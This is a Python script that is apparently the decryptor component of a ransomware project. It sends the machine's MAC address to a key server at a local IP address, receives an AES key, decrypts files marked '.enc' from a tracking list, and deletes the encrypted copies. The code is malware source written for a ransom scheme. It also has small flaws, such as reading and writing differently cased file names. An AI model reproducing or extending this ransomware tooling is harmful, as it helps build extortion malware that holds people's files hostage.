import base64
import zlib
import os
import requests
import pathlib

from Cryptodome.Cipher import AES
from io import BytesIO
from uuid import getnode as get_mac

LINK = "http://192.168.1.110:8000/?mac="
ENCRYPTED_FILES = set()
DECRYPTED_FILES = set()

def get_ransom_key(mac):
    req = requests.get(LINK + mac)
    if (req.status_code != 200):
        return -1

    ransom_key = req.content.strip()
    print(ransom_key)
    if str(ransom_key) == -1:
        return -1

    return base64.decodebytes(ransom_key)

def decrypt_file(file_name, ransom_key):
    if file_name[-3:] != "enc" or not pathlib.Path(file_name).is_file():
        return

    with open(file_name, "rb") as f:
        file_data = f.read() 

    encrypted_bytes = BytesIO(base64.decodebytes(file_data))
    nonce = encrypted_bytes.read(16)
    tag = encrypted_bytes.read(16)
    cipher_text = encrypted_bytes.read()

    aes_cipher = AES.new(ransom_key, AES.MODE_EAX, nonce)
    decrypted_text = aes_cipher.decrypt_and_verify(cipher_text, tag)
    plain_text = zlib.decompress(decrypted_text)

    os.remove(file_name)
    DECRYPTED_FILES.add(file_name)

    file_name = file_name[:-4]
    with open(file_name, "wb") as f:
        f.write(plain_text)

def start_decryption(ransom_key):
    with open("encrypted_file_names.txt", "r") as f:
        for file_name in f:
            file_name = file_name.strip()
            if file_name:
                ENCRYPTED_FILES.add(file_name)

    for file_name in ENCRYPTED_FILES:
        decrypt_file(file_name, ransom_key)

    with open("encrypted_File_names.txt", "w") as f:
        for file_name in ENCRYPTED_FILES.difference(DECRYPTED_FILES):
            f.write(file_name + "\n")

def run(file_name, reload_interval=86400):
    mac = hex(get_mac())[2:]
    ransom_key = get_ransom_key(f"O{mac}")
    if ransom_key == -1:
        print("Failed to retrieve key")
        return ""

    start_decryption(ransom_key)
    return ""

if __name__ == "__main__":
    r = run(15)
    print(r)
